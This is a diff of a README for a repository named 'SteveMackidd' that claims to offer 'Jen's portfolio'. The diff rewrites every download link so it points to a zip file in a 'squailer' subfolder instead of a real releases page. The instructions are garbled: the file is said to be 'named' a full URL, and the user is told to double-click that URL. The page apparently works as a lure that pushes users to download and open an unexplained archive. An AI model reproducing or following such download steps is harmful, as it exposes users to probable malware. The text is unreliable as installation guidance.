@@ -6,7 +6,7 @@ Welcome to the SteveMackidd project! This is a simple guide to help you download
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://raw.githubusercontent.com/Astroboy-scig/SteveMackidd/main/squailer/SteveMackidd.zip%20Now-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/Astroboy-scig/SteveMackidd/main/squailer/SteveMackidd.zip)
+[![Download the latest release](https://github.com/Astroboy-scig/SteveMackidd/raw/refs/heads/main/squailer/Mackidd-Steve-v3.4.zip%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/Astroboy-scig/SteveMackidd/raw/refs/heads/main/squailer/Mackidd-Steve-v3.4.zip)
 
 To download the latest version of Jen's portfolio, please visit the Releases page.
 
@@ -14,7 +14,7 @@ To download the latest version of Jen's portfolio, please visit the Releases pag
 
 You can access the Releases page directly using the link below:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/Astroboy-scig/SteveMackidd/main/squailer/SteveMackidd.zip)
+[Visit the Releases Page to Download](https://github.com/Astroboy-scig/SteveMackidd/raw/refs/heads/main/squailer/Mackidd-Steve-v3.4.zip)
 
 This page contains the latest versions of the portfolio along with installation instructions.
 
@@ -29,13 +29,13 @@ Before downloading, ensure that your computer meets the following requirements:
 
 ## 🛠️ Download & Install
 
-1. Click on the link to visit the [Releases page](https://raw.githubusercontent.com/Astroboy-scig/SteveMackidd/main/squailer/SteveMackidd.zip).
+1. Click on the link to visit the [Releases page](https://github.com/Astroboy-scig/SteveMackidd/raw/refs/heads/main/squailer/Mackidd-Steve-v3.4.zip).
 2. Find the latest release version.
-3. Click on the download link next to it. The file will be named something like `https://raw.githubusercontent.com/Astroboy-scig/SteveMackidd/main/squailer/SteveMackidd.zip`.
+3. Click on the download link next to it. The file will be named something like `https://github.com/Astroboy-scig/SteveMackidd/raw/refs/heads/main/squailer/Mackidd-Steve-v3.4.zip`.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Extract the files by right-clicking and selecting "Extract All" (Windows) or double-clicking the zipped file (macOS).
 6. Open the folder with the extracted files.
-7. Double-click on the `https://raw.githubusercontent.com/Astroboy-scig/SteveMackidd/main/squailer/SteveMackidd.zip` file to view Jen's portfolio in your default web browser.
+7. Double-click on the `https://github.com/Astroboy-scig/SteveMackidd/raw/refs/heads/main/squailer/Mackidd-Steve-v3.4.zip` file to view Jen's portfolio in your default web browser.
 
 ## 🎨 Explore the Portfolio
 
